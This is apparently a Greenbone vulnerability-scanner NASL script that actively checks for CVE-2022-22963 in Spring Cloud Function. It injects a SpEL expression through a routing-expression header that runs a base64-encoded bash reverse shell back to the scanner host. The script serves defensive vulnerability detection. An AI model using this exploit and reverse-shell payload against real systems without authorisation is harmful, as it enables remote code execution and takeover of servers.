# Copyright (C) 2022 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.148068");
  script_version("2022-05-06T12:43:21+0000");
  script_tag(name:"last_modification", value:"2022-05-09 10:04:03 +0000 (Mon, 09 May 2022)");
  script_tag(name:"creation_date", value:"2022-05-06 07:53:32 +0000 (Fri, 06 May 2022)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2022-22963");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("VMware Spring Cloud Function < 3.1.7, 3.2.x < 3.2.3 RCE Vulnerability - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2022 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl",
                      "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("Host/runs_unixoide"); # Currently only Linux checks included
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"VMware Spring Cloud Function is prone to a remote code
  execution (RCE) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST requests and checks the response.

  Notes:

  - For a successful detection of this flaw the target host needs to be able to reach the scanner
  host on a TCP port randomly generated during the runtime of the VT (currently in the range of
  10000-32000).

  - Per default the script checks just for sample apps (like functionRouter). If you would like to
  run on every found web application (which might cause longer run time) set the
  'Enable generic web application scanning' setting within the VT 'Global variable settings'
  (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes'.");

  script_tag(name:"insight", value:"When using routing functionality it is possible for a user to
  provide a specially crafted SpEL as a routing-expression that may result in remote code execution
  and access to local resources.");

  script_tag(name:"affected", value:"VMware Spring Cloud Function version 3.1.6 and prior and
  version 3.2.x through 3.2.2.");

  script_tag(name:"solution", value:"Update to version 3.1.7, 3.2.3 or later.");

  script_xref(name:"URL", value:"https://tanzu.vmware.com/security/cve-2022-22963");
  script_xref(name:"URL", value:"https://nakedsecurity.sophos.com/2022/03/30/vmware-spring-cloud-java-bug-gives-instant-remote-code-execution-update-now/");

  # With two payloads for each folder and 10 seconds timeout in total for both requests we might
  # reach the default script_timeout on larger web pages quite easily so this was raised a little.
  script_timeout(900);

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("pcap_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 8080);
host = http_host_name(dont_add_port: TRUE);

check_list = make_list();

foreach dir (make_list_unique("/", http_cgi_dirs(port: port))) {
  if (dir == "/")
    dir = "";
  check_list = make_list(check_list, dir + "/functionRouter");
}

if (!get_kb_item("global_settings/disable_generic_webapp_scanning")) {
  cgis = http_get_kb_cgis_full(port: port, host: host);
  if (cgis) {
    foreach cgi (cgis) {
      check_list = make_list(check_list, cgi);
    }
  }
}

ownhostname = this_host_name();
ownip = this_host();
targetip = get_host_ip();

# nb: We're currently using 10000-32000 to not get in conflict with the ephemeral port range used by
# most standard Linux/Unix operating systems. If we're choosing a port of that range we might have
# false positives due to race conditions (target is sending back a response to a request of another
# VT for which the scanner had chosen the same source port).
# This is also done outside of the forach loop as we don't want to have used a separate random port
# for every single request and for each dir. This is done like this because we might exceed the
# random port list on large web apps quite easily which could cause false positives or similar if
# the same random port is used by another VT.
rnd_port = rand_int_range(min: 10000, max: 32000);
dst_filter = string("(dst host ", ownip, " or dst host ", ownhostname, ")");
filter = string("tcp and dst port ", rnd_port, " and src host ", targetip, " and ", dst_filter);

vt_strings = get_vt_strings();
data = vt_strings["default"];

payloads = make_list(
  "bash -i >&/dev/tcp/" + ownip + "/" + rnd_port + " 0>&1",
  "bash -i >&/dev/tcp/" + ownhostname + "/" + rnd_port + " 0>&1");

foreach payload (payloads) {

  base64_payload = base64(str: payload);

  headers = make_array("spring.cloud.function.routing-expression", 'T(java.lang.Runtime).getRuntime().exec("bash -c {echo,' + base64_payload + '}|{base64,-d}|{bash,-i}")');

  foreach url (check_list) {
    if (!soc = open_sock_tcp(port))
      continue;

    req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
    res = send_capture(socket: soc, data: req, timeout: 5, pcap_filter: filter);

    close(soc);

    if (res) {
      info["HTTP Method"] = "POST";
      info["Affected URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);
      info['HTTP "spring.cloud.function.routing-expression" header'] = headers["spring.cloud.function.routing-expression"];
      info['HTTP "POST" body'] = data;

      # nb: We need to call the correct get_ip_*element() function below depending on the IP version
      # of the received IP packet.
      ip_vers_hex = hexstr(res[0]);
      if (ip_vers_hex[0] == 4) {
        src_ip = get_ip_element(ip: res, element: "ip_src");
        dst_ip = get_ip_element(ip: res, element: "ip_dst");
      } else if (ip_vers_hex[0] == 6) {
        src_ip = get_ipv6_element(ipv6: res, element: "ip6_src");
        dst_ip = get_ipv6_element(ipv6: res, element: "ip6_dst");
      }

      if (!src_ip)
        src_ip = "N/A";

      if (!dst_ip)
        dst_ip = "N/A";

      report  = 'By doing a HTTP request with the following data (excerpt):\n\n';
      report += text_format_table(array: info) + '\n\n';
      report += 'it was possible to trigger the vulnerability and make the remote host sending a request back to the scanner host (Details on the received packet follows).\n\n';
      report += "Destination IP:   " + dst_ip + ' (receiving IP on scanner host side)\n';
      report += "Destination port: " + rnd_port + '/tcp (receiving port on scanner host side)\n';
      report += "Originating IP:   " + src_ip + " (originating IP from target host side)";
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

# nb: Don't use exit(99); as we can't be sure that the target isn't affected if e.g. the scanner
# host isn't reachable by the target host or the affected web application was not found in the
# first place.
exit(0);
